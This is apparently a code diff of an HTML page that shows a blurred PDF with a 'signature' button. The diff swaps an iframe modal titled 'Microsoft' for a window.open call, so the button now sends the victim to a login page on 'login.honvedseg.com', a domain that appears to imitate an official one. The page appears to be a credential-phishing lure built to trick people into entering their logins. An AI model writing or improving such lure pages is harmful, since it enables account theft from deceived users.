@@ -2,112 +2,14 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>PDF with Signature Button on Page 2</title>
-  <style>
-    .modal {
-  display: none;
-  position: fixed;
-  z-index: 1000;
-  left: 0;
-  top: 0;
-  width: 100%;
-  height: 100%;
-  background-color: rgba(0,0,0,0.5);
-}
-
-.modal-content {
-  background-color: #fff;
-  margin: 5% auto;
-  padding: 0;
-  border-radius: 8px;
-  width: 80%;
-  max-width: 900px;
-  height: 80vh;
-  position: relative;
-}
-
-.close {
-  color: #aaa;
-  position: absolute;
-  top: 10px;
-  right: 20px;
-  font-size: 28px;
-  font-weight: bold;
-  cursor: pointer;
-}
-
-.close:hover,
-.close:focus {
-  color: #000;
-}
-
-iframe {
-  border: none;
-  width: 100%;
-  height: 100%;
-}
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f4f5f7;
-    }
-    #pdf-container {
-      width: 100%;
-      height: calc(100vh + 300px);
-      position: relative;
-    }
-    embed {
-      width: 100%;
-      height: 100%;
-      border: none;
-      transition: filter 0.3s ease;
-    }
-    #lock-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.2);
-      z-index: 998;
-      opacity: 0;
-      visibility: hidden;
-      transition: opacity 0.3s ease;
-    }
-    #lock-overlay.active {
-      opacity: 1;
-      visibility: visible;
-    }
-    #signature-button {
-      position: fixed;
-      bottom: 500px;
-      left: 50%;
-      transform: translateX(-50%);
-      padding: 12px 28px;
-      background-color: #007bff;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      cursor: pointer;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
-      z-index: 999;
-      opacity: 0;
-      visibility: hidden;
-      transition: opacity 0.3s ease;
-    }
-    #signature-button.visible {
-      opacity: 1;
-      visibility: visible;
-    }
-    .pdf-blurred embed {
-      filter: blur(4px);
-    }
-  </style>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <link rel="stylesheet" href="style.css">
+  <title>PDF with Signature</title>
 </head>
 <body>
-  <div id="pdf-container">
+
+
+<div id="pdf-container">
     <embed id="pdf-embed" src="./1.pdf#scrollbar=1" type="application/pdf" />
   </div>
 
@@ -121,12 +23,9 @@ iframe {
     const embed = document.getElementById("pdf-embed");
     const button = document.getElementById("signature-button");
     const overlay = document.getElementById("lock-overlay");
+    
+
     const body = document.body;
-      const modal = document.getElementById('modal');
-  const btn = document.getElementById('openSiteBtn');
-  const closeBtn = document.querySelector('.close');
-  const iframe = document.getElementById('siteFrame');
-  const siteUrl = 'https://login.hondevseg.com';
     let activated = false;
 
     let isSecondPageVisible = false;
@@ -171,11 +70,13 @@ iframe {
       overlay.classList.remove("active");
       body.classList.remove("pdf-blurred");
       isLocked = false;
+
+window.open('https://login.honvedseg.com', '_blank', 'noopener,noreferrer');
       // You can also hide the button after click if desired:
       button.classList.remove("visible");
+      
       button.remove();
-      iframe.src = siteUrl;
-    modal.style.display = 'block';
+
       // ... start your signature / acknowledgment flow here
       
     });
@@ -185,18 +86,17 @@ document.addEventListener('DOMContentLoaded', () => {
           body.classList.add("pdf-blurred");
           overlay.classList.add("active");
 });
-    // Attach scroll / resize listeners
+    // Attach scroll / resize listener
+
+
     window.addEventListener("scroll", updateScrollState);
     window.addEventListener("resize", updateScrollState);
 
     // Initial check
     //updateScrollState();
   </script>
-  <div id="modal" class="modal">
-  <div class="modal-content">
-    <span class="close">&times;</span>
-    <iframe id="siteFrame" src="https://login.honvedseg.com" width="100%" height="500" title="Microsoft"></iframe>
-  </div>
+
 </div>
 </body>
+<script src="script.js"></script>
 </html>
